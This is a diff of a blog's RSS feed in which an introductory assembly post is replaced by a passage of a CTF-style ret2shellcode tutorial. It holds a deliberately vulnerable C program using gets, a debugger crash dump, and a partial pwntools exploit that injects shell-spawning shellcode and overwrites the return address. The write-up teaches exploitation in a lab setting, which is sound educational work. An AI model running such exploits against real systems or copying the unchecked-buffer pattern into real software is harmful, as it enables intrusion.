@@ -7,30 +7,235 @@
 		<atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
 		
 			<item>
-				<title>Basics of assembly</title>
-				<description>&lt;p&gt;Here is an introduction of some assembly instruction which are useful while doing code analysis&lt;/p&gt;
+				<title>ret2shellcode</title>
+				<description>&lt;p&gt;We will take a look at a ret2shellcode challenge.
+The files can be found &lt;a href=&quot;http://google.com&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
 
-&lt;h1 id=&quot;what-is-assembly&quot;&gt;What is assembly?&lt;/h1&gt;
-&lt;p&gt;Assembly is a low-level programming language which is designed to interact with the computer’s hardware directly. Essentially, it is the opcode representation of machine language. Because of this, it is also called symbolic machine code.&lt;/p&gt;
+&lt;h1 id=&quot;analysis&quot;&gt;Analysis&lt;/h1&gt;
+&lt;h2 id=&quot;code-analysis&quot;&gt;Code Analysis&lt;/h2&gt;
+&lt;p&gt;Lets take a look at the source code.&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&amp;lt;stdio.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;// Compiled with: gcc ret2shellcode.c -o ret2shellcode -z execstack -no-pie -fno-stack-protector &lt;/span&gt;
 
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;instruction&lt;/th&gt;
-      &lt;th style=&quot;text-align: center&quot;&gt;purpose&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;push&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;pop&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
+&lt;span class=&quot;n&quot;&gt;__attribute__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;constructor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ignore_me&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;setbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;setbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;setbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arg1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arg2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arg1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xdeadbeef&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arg2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xcafebabe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;You're awesome&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;environ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Show me your creativity :P&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;For now, Imma tell you a secret: %p&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The program has three functions; ignore_me, win and main. &lt;em&gt;main&lt;/em&gt; is a special function in C language. It is where the main functionality of the program lies. &lt;em&gt;ignore_me&lt;/em&gt; is declared as a constructor here. Constructors are functions which are executed &lt;em&gt;before&lt;/em&gt; main. Their counterparts are called de-constructors. They are executed &lt;em&gt;after&lt;/em&gt; main.&lt;/p&gt;
+
+&lt;p&gt;Here &lt;em&gt;ignore_me&lt;/em&gt; just sets up buffering for the challenge.&lt;/p&gt;
+
+&lt;p&gt;Lets take a closer look at &lt;em&gt;main&lt;/em&gt; function. The function first allocates 0x60 bytes for a buffer called &lt;em&gt;buf&lt;/em&gt;. Then it prints two lines. The first one is not important. The second one tells us the address of buf buffer. After that, it calls gets function. The &lt;a href=&quot;https://man7.org/linux/man-pages/man3/gets.3.html&quot;&gt;man page of gets&lt;/a&gt; shouts “Never use this function”. Because, this function does not check if the destionation buffer can hold the data. This gives rise to buffer overflow.&lt;/p&gt;
+
+&lt;p&gt;And the &lt;em&gt;win&lt;/em&gt; function compares the first and second argument with some specific values and gives us shell if they match.&lt;/p&gt;
+
+&lt;h3 id=&quot;buffer-overflow&quot;&gt;Buffer Overflow&lt;/h3&gt;
+&lt;p&gt;This is a situation in which a program puts data in a buffer more than its capacity. This results in overwriting memory adjacent to the data region. Mostly, buffers are on stack and sensitive data related to program execution is also stored on stack. This way buffer overflows can be a serious threat in a computer program.&lt;/p&gt;
+
+&lt;p&gt;Buffer overflow attacks overwrite the data related to program execution and control the program’s execution. The most important data on stack is saved RIP/EIP. This is the address where the program will start execution after main function. Overwriting it with something useful can get us a shell.&lt;/p&gt;
+
+&lt;p&gt;Getting shell usually depends upon the situation.&lt;/p&gt;
+
+&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;
+&lt;h2 id=&quot;checksec&quot;&gt;Checksec&lt;/h2&gt;
+&lt;p&gt;Lets first check protections enabled on the binary. This can be done with checksec tool. It comes with &lt;a href=&quot;https://github.com/Gallopsled/pwntools&quot;&gt;pwntools&lt;/a&gt; also.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX disabled
+PIE:      No PIE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x400000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+RWX:      Has RWX segments
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Arch: tells architecture of binary.&lt;/li&gt;
+  &lt;li&gt;RELRO: tells if the GOT section is read-only or not. There are three situtation of RELRO:
+    &lt;ol&gt;
+      &lt;li&gt;NO RELRO: GOT section is not read-only and it is &lt;em&gt;after&lt;/em&gt; global variables.&lt;/li&gt;
+      &lt;li&gt;Partial RELRO: GOT section is not read-only and it is &lt;em&gt;before&lt;/em&gt; global variables.&lt;/li&gt;
+      &lt;li&gt;Full RELRO: GOT section is read-only and it is &lt;em&gt;before&lt;/em&gt; global variables.&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Stack: tells if canary protection is enabled or not.&lt;/li&gt;
+  &lt;li&gt;NX: tells if non-executable stack protection is enabled or not.&lt;/li&gt;
+  &lt;li&gt;PIE: tells if Position Independent Execution is enabled or not.&lt;/li&gt;
+  &lt;li&gt;RWX: tells if binary has read-write-executable pages.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;In this case, RELRO, Canary, NX and PIE are disabled.&lt;/p&gt;
+
+&lt;h2 id=&quot;buffer-overflow-exploitation&quot;&gt;Buffer Overflow Exploitation&lt;/h2&gt;
+&lt;p&gt;In Buffer Overflow attacks, first we calculate number of bytes until we reach saved RIP. We usually call it “offset”. This can be calculated using cyclic patterns.&lt;/p&gt;
+
+&lt;h3 id=&quot;offset-calculation&quot;&gt;Offset calculation&lt;/h3&gt;
+&lt;p&gt;For calculation of offset, we need to generate cyclic pattern which will possibly overwrite saved RIP. If your guess didn’t overwrite RIP, just increase it.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;I generated cyclic pattern of 150 bytes using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cyclic 150&lt;/code&gt;.&lt;br /&gt;&lt;/li&gt;
+  &lt;li&gt;Copy the resulting pattern.&lt;br /&gt;&lt;/li&gt;
+  &lt;li&gt;Start the program in gdb using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb ./ret2shellcode&lt;/code&gt;.&lt;br /&gt;&lt;/li&gt;
+  &lt;li&gt;Paste the copied pattern and you should get a Segmentation Fault error. This shows that you overwrote the saved RIP.&lt;br /&gt;
+It should be something like this:&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Program received signal SIGSEGV, Segmentation fault.
+0x0000000000401238 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;main &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; Legend: Modified register | Code | Heap | Stack | String &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$rax&lt;/span&gt;   : 0x0               
+&lt;span class=&quot;nv&quot;&gt;$rbx&lt;/span&gt;   : 0x0               
+&lt;span class=&quot;nv&quot;&gt;$rcx&lt;/span&gt;   : 0x00007ffff7f9f980  →  0x00000000fbad208b
+&lt;span class=&quot;nv&quot;&gt;$rdx&lt;/span&gt;   : 0x0               
+&lt;span class=&quot;nv&quot;&gt;$rsp&lt;/span&gt;   : 0x00007fffffffdfb8  →  &lt;span class=&quot;s2&quot;&gt;&quot;baabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$rbp&lt;/span&gt;   : 0x6261617a61616179 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;yaaazaab&quot;&lt;/span&gt;?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$rsi&lt;/span&gt;   : 0x00007ffff7f9fa03  →  0xfa2680000000000a
+&lt;span class=&quot;nv&quot;&gt;$rdi&lt;/span&gt;   : 0x00007ffff7fa2680  →  0x0000000000000000
+&lt;span class=&quot;nv&quot;&gt;$rip&lt;/span&gt;   : 0x0000000000401238  →  &amp;lt;main+78&amp;gt; ret 
+&lt;span class=&quot;nv&quot;&gt;$r8&lt;/span&gt;    : 0x00007fffffffdf50  →  &lt;span class=&quot;s2&quot;&gt;&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$r9&lt;/span&gt;    : 0x0               
+&lt;span class=&quot;nv&quot;&gt;$r10&lt;/span&gt;   : 0x00007ffff7fef110  →  &amp;lt;strcmp+4144&amp;gt; pxor xmm0, xmm0
+&lt;span class=&quot;nv&quot;&gt;$r11&lt;/span&gt;   : 0x246             
+&lt;span class=&quot;nv&quot;&gt;$r12&lt;/span&gt;   : 0x0000000000401080  →  &amp;lt;_start+0&amp;gt; xor ebp, ebp
+&lt;span class=&quot;nv&quot;&gt;$r13&lt;/span&gt;   : 0x0               
+&lt;span class=&quot;nv&quot;&gt;$r14&lt;/span&gt;   : 0x0               
+&lt;span class=&quot;nv&quot;&gt;$r15&lt;/span&gt;   : 0x0               
+&lt;span class=&quot;nv&quot;&gt;$eflags&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;zero carry parity adjust sign &lt;span class=&quot;nb&quot;&gt;trap &lt;/span&gt;INTERRUPT direction overflow RESUME virtualx86 identification]
+&lt;span class=&quot;nv&quot;&gt;$cs&lt;/span&gt;: 0x0033 &lt;span class=&quot;nv&quot;&gt;$ss&lt;/span&gt;: 0x002b &lt;span class=&quot;nv&quot;&gt;$ds&lt;/span&gt;: 0x0000 &lt;span class=&quot;nv&quot;&gt;$es&lt;/span&gt;: 0x0000 &lt;span class=&quot;nv&quot;&gt;$fs&lt;/span&gt;: 0x0000 &lt;span class=&quot;nv&quot;&gt;$gs&lt;/span&gt;: 0x0000 
+
+0x00007fffffffdfb8│+0x0000: &lt;span class=&quot;s2&quot;&gt;&quot;baabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma&quot;&lt;/span&gt;     ← &lt;span class=&quot;nv&quot;&gt;$rsp&lt;/span&gt;
+0x00007fffffffdfc0│+0x0008: &lt;span class=&quot;s2&quot;&gt;&quot;daabeaabfaabgaabhaabiaabjaabkaablaabma&quot;&lt;/span&gt;
+0x00007fffffffdfc8│+0x0010: &lt;span class=&quot;s2&quot;&gt;&quot;faabgaabhaabiaabjaabkaablaabma&quot;&lt;/span&gt;
+0x00007fffffffdfd0│+0x0018: &lt;span class=&quot;s2&quot;&gt;&quot;haabiaabjaabkaablaabma&quot;&lt;/span&gt;
+0x00007fffffffdfd8│+0x0020: &lt;span class=&quot;s2&quot;&gt;&quot;jaabkaablaabma&quot;&lt;/span&gt;
+0x00007fffffffdfe0│+0x0028: 0x0000616d6261616c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;laabma&quot;&lt;/span&gt;?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+0x00007fffffffdfe8│+0x0030: 0x2ced48e1cc2282d4
+0x00007fffffffdff0│+0x0038: 0x0000000000401080  →  &amp;lt;_start+0&amp;gt; xor ebp, ebp
+
+0x40122d &amp;lt;main+67&amp;gt;        call   0x401070 &amp;lt;gets@plt&amp;gt;
+0x401232 &amp;lt;main+72&amp;gt;        mov    eax, 0x0
+0x401237 &amp;lt;main+77&amp;gt;        leave  
+→   0x401238 &amp;lt;main+78&amp;gt;        ret    
+&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Cannot disassemble from &lt;span class=&quot;nv&quot;&gt;$PC&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: I’m using &lt;a href=&quot;https://github.com/hugsy/gef&quot;&gt;gdb-gef&lt;/a&gt; plugin.&lt;br /&gt;&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;To calculate the offset, copy the first four characters on top of stack. It is “baab” in this case. Or you can also calculate it by copying the first word on stack. It can be determined by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x/wx $rsp&lt;/code&gt;.&lt;br /&gt;&lt;/li&gt;
+  &lt;li&gt;To get the offset, give the four characters or first word on stack by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cyclic -l &amp;lt;value&amp;gt;&lt;/code&gt;. This yields 104 (0x68).&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;There is a strong correspondence between the calculated offset and the source code. The buffer is of size 0x60 and the offset is 0x68. But, why is it &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sizeof(buf)+8&lt;/code&gt;?&lt;br /&gt;
+This is because the stack(frame) of main function contains only &lt;em&gt;buf&lt;/em&gt; buffer. It is adjacent to the sensitive data I was talking about earlier. The sensitive data is saved RBP and saved RIP. saved RBP is the base pointer which will be used when main returns. After saved RBP, comes saved RIP. That’s why we need 8 more bytes to get upto saved RIP.&lt;/p&gt;
+
+&lt;h3 id=&quot;ret2shellcode&quot;&gt;ret2shellcode&lt;/h3&gt;
+&lt;p&gt;Now we have RIP under-control. But, &lt;a href=&quot;https://hackmd.io/@stdnoerr/rip_control&quot;&gt;what now&lt;/a&gt;?
+Since NX is disabled, the easiest way is to execute a shellcode which gives us a shell.&lt;br /&gt;
+But, for this, we need to have something where we can put it and we need to know its location in order to return to it.&lt;br /&gt;
+Luckily, both of these requirements are satisfied in this situation. We have a buffer we can write to and the program gives us its address.&lt;br /&gt;
+Lets start writing our exploit script.&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
+&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;REMOTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'localhost'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1337&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'./ret2shellcode'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;### Exploit Goes here ###
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x68&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;First we need to store buffer’s address which is printed by the binary.&lt;/p&gt;
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;buf_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Then the shellcode we want to execute. I used pwntools shellcraft utility for this.&lt;/p&gt;
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcraft&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;linux&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Now we need to craft such a payload which will overwrite the RIP with buffer’s address and the buffer contains the shellcode.&lt;/p&gt;
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# store the shellcode
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Add junk until we reach saved RIP
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Overwrite RIP with buf's address
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Now just send the payload.&lt;/p&gt;
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# sendline because gets waits until a newline(\n)
